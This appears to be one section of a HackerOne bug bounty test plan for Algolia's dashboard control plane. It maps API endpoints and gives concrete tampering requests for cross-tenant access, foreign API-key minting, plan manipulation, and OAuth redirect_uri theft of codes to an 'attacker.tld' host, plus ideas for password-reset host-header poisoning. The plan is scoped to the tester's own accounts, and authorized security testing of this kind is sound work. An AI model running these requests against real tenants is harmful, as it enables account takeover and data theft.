# 07 — Dashboard (control-plane) Testing

> Part of the Algolia HackerOne engagement package. Read `01-scope-and-rules.md` for the scope fence and `03-hunt-plan.md` for prioritization first. All testing is authorized **only** against the four in-scope assets, non-destructive, own-test-accounts-only, rate-limit-aware. Note: the dashboard SPA drives a separate backend `api.dashboard.algolia.com`. Confirm on the live policy page that this host is in scope before tampering; if only `dashboard.algolia.com` is authorized, restrict to same-origin requests the SPA itself issues.

---

## Facet: `dashboard.algolia.com` — Customer Control-Plane Deep-Dive

> **Scope caveat (read first).** The task asset list names `dashboard.algolia.com` (URL) and `www.algolia.com` (URL). Research below shows the dashboard SPA does almost all privileged work against a **separate backend host, `api.dashboard.algolia.com`**, and authenticates via `dashboard.algolia.com/oauth/*`. Neither `api.dashboard.algolia.com` nor the `dev-*` hosts are literally in the task's four-asset list, so **before sending a single tampered request, confirm on the live HackerOne scope table (`hackerone.com/algolia/policy_scopes`) that the dashboard API host / `*.algolia.com` is in scope.** If only `dashboard.algolia.com` is authorized, restrict testing to same-origin requests the SPA itself issues from that origin. Do not test `dev-api.dashboard.algolia.com`, `dev-dashboard.algolia.com`, `dev-admin.algolia.com` unless explicitly listed.

### 1. Architecture at a glance (VERIFIED PUBLIC FACTS)

| Layer | Host | Notes |
|---|---|---|
| Auth front-end / login SPA | `dashboard.algolia.com` | Devise-style routes (`/users/sign_in`, presumably `/users/password/new`, `/users/sign_up`), SSO at `/auth/sso`. Sign-in page confirmed live. |
| OAuth2 authorize/token | `dashboard.algolia.com/oauth/authorize`, `/oauth/token` (CLI variant `/2/oauth/authorize`, `/2/oauth/token`, `/2/oauth/revoke`) | Auth-code + **PKCE (`S256`)**. Default scope `public applications:manage keys:manage`. Refresh + revoke supported. |
| **Control-plane API** | **`api.dashboard.algolia.com`** | JSON:API (`Accept: application/vnd.api+json`), `Authorization: Bearer <token>`, `Content-Type: application/json`. This is where apps/keys/plan/user live. |
| Static assets | `static.dashboard.algolia.com` | SPA bundle (source of endpoint recon). |
| Search/indexing data plane | `{APPID}-dsn.algolia.net`, `{APPID}-1.algolia.net`, `{APPID}.algolia.net` | Admin/Search API keys act here (`/1/keys`, `/1/indexes/*`, `/1/logs`). |
| Dev (likely OUT of scope) | `dev-api.dashboard.algolia.com`, `dev-dashboard.algolia.com`, `dev-admin.algolia.com` | Seen in recon wordlists; verify scope. |

**The single most important structural fact for this facet:** the control-plane API addresses tenants by **Application ID**, e.g. `GET /1/application/{APP_ID}`. The Application ID is **not a secret** — it is published in every website's client-side search code (`x-algolia-application-id` header, `{APPID}-dsn.algolia.net` DSN hostname, `algoliasearch("APPID","searchkey")` init). Any Algolia customer's appID can be harvested in seconds from their public site. Therefore **all tenant isolation must be enforced at the token/user level; there is zero security-through-obscurity on the object identifier.** That makes this API a textbook BOLA/IDOR candidate and is the crown-jewel test of this facet.

### 2. Confirmed control-plane API endpoints (`api.dashboard.algolia.com`)

Derived from the official `algolia/cli` `api/dashboard/client.go` and the Algolia MCP node client (both open source):

| Operation | Method | Path |
|---|---|---|
| List my applications | GET | `/1/applications?page={n}` |
| Get one application | GET | `/1/application/{appID}` *(singular — note inconsistency vs list)* |
| Create application | POST | `/1/applications` |
| Update application | PATCH | `/1/applications/{appID}` |
| Create API key | POST | `/1/applications/{appID}/api-keys` |
| **Rotate API key** | POST | `/1/applications/{appID}/api-keys/{keyUUID}/rotate` |
| Change plan (self-serve) | PATCH | `/1/applications/{appID}/plan/self-serve` |
| List self-serve plans | GET | `/1/plan-templates/self-serve` |
| Current user | GET | `/1/user` |
| Hosting regions | GET | `/1/hosting/regions` |
| Crawler user | GET | `/1/crawler/user` |

Endpoints **not** in the CLI (CLI is single-user, scope `applications:manage keys:manage` only) but which the dashboard UI must call — **discover these live by proxying the Team / Billing / Members pages** (Burp + browser DevTools, filter XHR to `api.dashboard.algolia.com`): team/member CRUD, invitation issue/accept/revoke, per-application & per-index permission grants, billing/payment-method, usage/metrics, audit logs. Disclosed report #156520 references an **`/1/admin/*`** namespace ("see all API calls through `/1/admin/*`") — enumerate under `/1/admin/`.

### 3. Authentication surface

- **Email/password:** Devise-style (`/users/sign_in`). Test session-cookie rotation on login (fixation), `remember_user_token` handling, and whether the OAuth/Bearer token is minted **before** a second factor is satisfied.
- **Social login:** Google (and historically GitHub) SSO. Users who signed up via social can also set a password — probe for **account-linking confusion** (same email via password vs Google → merge or takeover).
- **Enterprise SAML SSO** (`/auth/sso`, committed/Enterprise plans, enabled via a support-provisioned hash URL). SP-initiated; classic SAML bugs apply (signature stripping/wrapping, unsigned assertion acceptance, `RelayState` open redirect, IdP-confusion). Documented quirk: **a brand-new SSO user gets a fresh account + application rather than joining the org** — probe the boundary between "new SSO identity" and "existing invited member" (email-based auto-join / domain-capture escalation).
- **2FA/MFA:** present and **heavily reported already** (see dedup). Only pursue a genuinely fresh twist (e.g. MFA not enforced on the Bearer-token/OAuth path, or on the API vs the web login).

### 4. Authorization model (org / team / roles / per-app / per-index) — VERIFIED

- Each application has exactly **one owner** (highest privilege: manages team, billing, all keys). Ownership is transferable via support.
- **Team members** are invited by email from the **Team** page and granted access **per application, optionally per index**.
- Permissions are grouped into **six sections** (verified naming): **Set-up Search** (add records / edit index settings), **View Search** (dashboard search page / view settings), **Team** (add members / view permissions), **Billing** (see billing), **Features** (A/B testing, Query Suggestions, Analytics, etc.), **Crawler** (view/configure), plus **Other** (view/edit API keys). Manage members/resend-invite/copy-permissions via the 3-dot menu.
- This is a rich RBAC surface enforced **server-side in the dashboard API**, and it is exactly the kind of matrix where a single permission field sent from the client is trusted. **This is the highest-value, least-saturated area of the facet.**

### 5. Priority test plan (AUTHORIZATION-first) — concrete request tampering

All examples assume you captured a valid `Bearer` token for **your own** account (from the SPA after login, or via the OAuth/CLI flow) and harvested a victim `APP_ID` from a public site. Use **your own second test tenant** as the "victim" to stay non-destructive and within RoE.

**5.1 BOLA / cross-tenant read on an application (crown jewel)**
```http
GET /1/application/{OTHER_TENANT_APP_ID} HTTP/1.1
Host: api.dashboard.algolia.com
Authorization: Bearer <ATTACKER_TOKEN>
Accept: application/vnd.api+json
```
Positive signal: `200` returning the foreign app's object (`name`, `plan_label`, `api_key`, `api_key_uuid`, `acl`) instead of `403/404`. Leaking `api_key` = full data-plane compromise of that tenant.

**5.2 Cross-tenant API-key creation / rotation (privilege grant on a foreign app)**
```http
POST /1/applications/{OTHER_TENANT_APP_ID}/api-keys HTTP/1.1
Host: api.dashboard.algolia.com
Authorization: Bearer <ATTACKER_TOKEN>
Content-Type: application/json

{"acl":["search","browse","addObject","deleteObject","settings","editSettings","logs","seeUnretrievableAttributes"],"description":"poc","indexes":["*"]}
```
Also test `POST /1/applications/{OTHER_APP}/api-keys/{keyUUID}/rotate`. Positive: `201/200` mints/rotates a key on a tenant you don't own → full read/write on their indices. (Rotate is especially nasty: rotating a victim's admin key both grants you a key *and* can be leveraged for disruption — keep PoC to your own tenant.)

**5.3 Privilege escalation within a team (role/permission tampering)**
Discover the member/permission-update call on the Team page, then replay it as a **low-privilege member** flipping your own row:
- Change your own permission set to include **Team** + **Other (edit API keys)** + **Billing**.
- Add an index you weren't granted, or widen `indexes:["specific"]` → `["*"]`.
- Add yourself to an application you have no grant on.
Positive: server accepts a permission set richer than what your role should allow, confirmed by re-reading `/1/user` or the members list and by then successfully performing a gated action (e.g. creating an admin key).

**5.4 Invitation / membership tampering**
- Accept-invite flow: is the invite token bound to the invited email? Try **accepting an invitation with a different logged-in account** → join a tenant you were never invited to.
- Tamper the `application_id` / `permissions` / `role` in the *invite-creation* body to grant more than the UI offers, or invite yourself to a foreign `APP_ID`.
- **Deprovisioning:** after a member is removed, do their previously issued tokens/keys still work? (Directly adjacent to disclosed #156520 — removed members retained `/1/admin/*` access. Look for a *new* variant: OAuth refresh token or admin API key not revoked on removal.)
- IDOR on invite/member object IDs: `GET/PATCH/DELETE /1/.../invitations/{id}` or `/members/{id}` with an ID from another org.

**5.5 Billing / plan tampering (self-serve)**
```http
PATCH /1/applications/{MY_APP_ID}/plan/self-serve HTTP/1.1
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"plan_id":"<a-higher-tier-id-from /1/plan-templates/self-serve>","accept_terms":true}
```
Positive: plan upgraded **without a payment method** (`has_payment_method:false` user, from the `DashboardUser` struct) or negative price accepted; or the same PATCH succeeds against **another tenant's** `APP_ID`. Also test downgrading/manipulating a foreign tenant's plan (denial/financial impact).

**5.6 Account-takeover chains (test on your own accounts)**
- **OAuth `redirect_uri` abuse (HIGH — scope is `applications:manage keys:manage`):**
```
GET /oauth/authorize?client_id=<DASHBOARD_OR_CLI_CLIENT_ID>&response_type=code&redirect_uri=https://attacker.tld/cb&scope=public%20applications:manage%20keys:manage&code_challenge=<c>&code_challenge_method=S256&state=<s>
```
Test loose `redirect_uri` matching: unregistered origin, subdomain (`attacker.dashboard.algolia.com`-style), added path/query, `%2f`/`%252f`/`@`/`#` tricks, `localhost:<any-port>` (CLI uses a local loopback callback — if the port/path aren't strictly pinned, a malicious local listener or a loose match steals the code). A stolen code + public PKCE (or a downgraded/missing PKCE) → attacker mints a token with full app+key management = complete account takeover. Positive: authorization code delivered to an origin you control, exchangeable at `/oauth/token`.
- **Password reset:** entropy/reuse of reset tokens; token not invalidated after use, after email change, or after password change; **host-header / `X-Forwarded-Host` injection** poisoning the reset link (Rails/Devise apps are historically prone) → reset link points to attacker host. Positive: valid reset link generated for a domain you control, or a reset token still valid post-use.
- **Email change:** does changing the account email require the current password / re-auth? Is the new address confirmed before it becomes the login identity / reset target? IDOR on the email-change object (change *another* user's email → then reset). Positive: email changed without re-auth or without confirming ownership of the new address.
- **Session fixation / cookie hygiene:** capture the pre-login session cookie; if it is unchanged after successful login, fixation is viable. Check `Secure`/`HttpOnly`/`SameSite` on `dashboard.algolia.com` session cookies and whether logout/password-change invalidates server-side sessions and outstanding Bearer/refresh tokens.

**5.7 Crawler control-plane** (`/1/crawler/user`, Crawler permission section): the Crawler is a fetch-the-web feature → probe **SSRF** in crawler URL config and **BOLA** on crawler config objects across apps. (Confirm Crawler is in the H1 scope first.)

### 6. Adjacent: Search-API key ACL surface (data plane)

Managed from the dashboard's **API Keys** page but executed with the **Admin API key** against `https://{APPID}.algolia.net/1/keys`. ACL vocabulary: `search, browse, addObject, deleteObject, deleteIndex, settings, editSettings, listIndexes, logs, analytics, recommendation, usage, seeUnretrievableAttributes`. Restrictions: `indexes` (prefix/suffix `*`), `referers`, `validity`, `maxHitsPerQuery`, `maxQueriesPerIPPerHour`, `queryParameters`. Disclosed #118925 ($1000): a key scoped to one index worked across all — so **re-test scoping enforcement**: create a key restricted to `indexA`, use it against `indexB`; test `indexes:["prefix_*"]` boundary bypasses (`prefix_../other`, unicode, trailing dot), and whether `referers` restriction is enforced server-side or only advisory. Note the well-worn "exposed admin key in client code" class is saturated (see dedup) — the fresh angle is **ACL-restriction bypass**, not "found a key."

### 7. How to run recon politely (non-destructive)

- Proxy the whole authenticated dashboard through Burp; **map every `api.dashboard.algolia.com` route** the SPA calls, especially on Team, Members, Billing, API Keys, Usage. Diff requests between an **owner** account and an invited **low-priv member** account (two test tenants) — the delta reveals which fields the server actually authorizes.
- Keep concurrency at 1–2, human-paced. Automated scanner output alone is **not reportable** to this program.
- Use **two of your own tenants** as attacker/victim for every cross-tenant PoC; access the minimum needed to demonstrate impact, then stop.
